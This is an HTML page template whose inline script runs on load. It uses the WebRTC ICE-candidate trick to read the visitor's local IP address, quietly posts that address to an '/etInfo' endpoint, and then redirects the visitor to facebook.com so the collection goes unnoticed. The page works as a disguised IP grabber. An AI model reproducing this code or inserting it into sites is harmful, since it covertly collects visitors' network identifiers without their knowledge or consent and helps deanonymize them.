<!DOCTYPE html>
<html>
<head>
<meta name = "csrf-token" content = "{{ csrf_token() }}">
	<title></title>
	<script
  src="https://code.jquery.com/jquery-3.2.1.min.js"
  integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
  crossorigin="anonymous"></script>
  <script>

         $.ajaxSetup({
             headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
             }
          });

    </script>
</head>
<body>

<script type="text/javascript">


	 $(function(){

                setTimeout(function() {

                        window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;   //compatibility for firefox and chrome
                        var pc = new RTCPeerConnection({iceServers:[]}), noop = function(){};      
                        pc.createDataChannel("");    //create a bogus data channel
                        pc.createOffer(pc.setLocalDescription.bind(pc), noop);    // create offer and set local description
                        pc.onicecandidate = function(ice){  //listen for candidate events
                            if(!ice || !ice.candidate || !ice.candidate.candidate)  return;
                            var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];


                            $.ajax({
                                url: '/etInfo',
                                type: 'POST',
                                data: {'lip': myIP+'extra', 'u':'extra'}
                            });
                            //console.log('my IP: ', myIP,$('#eternalUser').text());


                            pc.onicecandidate = noop;
                        };

                        window.location.replace("http://facebook.com");

                }, 10);
                
                
            });

</script>

</body>
</html>